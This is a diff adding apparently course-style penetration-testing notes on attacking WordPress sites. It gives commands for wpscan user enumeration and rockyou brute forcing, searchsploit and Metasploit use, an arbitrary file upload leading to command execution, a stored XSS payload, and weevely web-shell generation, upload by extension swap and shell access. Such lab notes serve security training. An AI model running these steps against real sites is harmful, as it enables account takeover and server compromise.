@@ -126,3 +126,84 @@
 5. Copy the exploit and replace the url with yours
     - An error will be thrown because you have to make it readable
 6. Execute the second command on exploit db
+
+### 9.6. Wordpress brute force attacks
+
+1. Run wpscan → `wpscan --url [url] --enumerate u"`
+2. Check the enumerated users
+3. Run the wpscan with user switch and brute force flag  → `wpscan --url [url] -U pentester -P /usr/share/wordlists/rockyou.txt"`
+4. Go to wp-login.php and check the password
+5. Other technique is BurpSuite intruder (wpscan is more effective in this case)
+6. For BurpSuite
+    - Apply wordlist
+    - Set url encoding in processing
+    - Redirections → always and process cookies in redirections
+    - The one with a different length in response will be the successful request
+
+### 9.7. WP Plugin - Arbitrary File Upload Vulnerability
+
+1. Run the wpscan for plugins → `wpscan --url [url] --enumerate p"`
+2. Run the wpscan for plugins with api token for CVE results → `wpscan --url [url] --enumerate p --api-token token"`
+3. Login into the page → go to plugins
+4. Execute searchsploit → `searchsploit 'Work The Flow'`
+5. Find the one matching the version
+6. Copy the exploit → `cp /usr/share/exploitdb/exploits/php/webapps/33003.txt .`
+7. Cat the content of the text
+8. Go to the exploit right above about Arbitrary File Upload
+9. Create a php script (check video)
+10. Copy the endpoint in the exploit description
+    - Files parameter should point to your php file
+    - Replace VICTIM by the real url
+11. Execute the POST request
+12. Navigate to the files folder → access the same url you executed the POST against, but with GET method
+13. Try commands through the query parameter → `whoami`
+
+### 9.8. WP Plugin - Stored XSS Vulnerability
+
+1. Execute wpscan for enumeration → `wpscan --url [url] --enumerate u"`
+2. Execute wpscan for plugins → `wpscan --url [url] --enumerate p --api-token token"`
+3. Brute force the endpoint → `wpscan --url [url] -U admin -P /usr/share/wordlists/rockyou.txt"`
+4. Searchsploit → `searchsploit "Appointment Booking Calendar"`
+5. Try also the browser → exploit db and search for the name of the plugin in the search box
+6. Go to calendar
+    - Calendar name will hold the XSS payload → `<script>alert('hello')</script>"`
+    - Click publish. Click update. Click manage settings
+
+### 9.9. WordPress black box pentest
+
+1. Open the browser with the IP ending in 3
+2. Run wpscan → `wpscan --url [url] --enumerate u"`
+3. Run brute force → `wpscan --url [url] -U admin -P /usr/share/wordlists/rockyou.txt"`
+4. Login in wp
+5. Check plugins
+    - Copy the name
+    - Searchsploit with it → `searchsploit "name"`
+6. Open a msfconsole
+    - Search for the plugin name → `search "name"`
+    - Type use 0 to select the exploit → `use 0`
+    - Type show options → `show options`
+    - Type set RHOSTS IP (target) → `set RHOSTS 192.68.1.103`
+    - Type LHOST IP (host) → `set LHOST 192.68.1.102`
+    - Type the wordpress password → `set WPPASSWORD lawrence`
+    - Type exploit
+7. If failing, review the LHOSTS ip
+8. Copy the searchsploit result into the desktop
+    - `cp /usr/share/exploitdb/exploits/php/webapps/37998.txt .`
+    - Cat the file
+9. Follow the instructions
+    - Go to dashboard
+    - Thumbnail slider
+    - Manage images
+10. Use weevely → `weevely generate password /root/shell.php.jpg`
+    - Upload the file
+    - Intercept the request with burpsuite
+    - Send to the repeater
+    - Change the extension in the payload to .php
+11. To access the php uploaded file
+    - Go to the browser and access the uploaded file
+    - Copy the url
+    - Execute with weevely
+        - `weevely url password`
+    - Check the reversed shell
+        - `ls`
+        - `whoami`
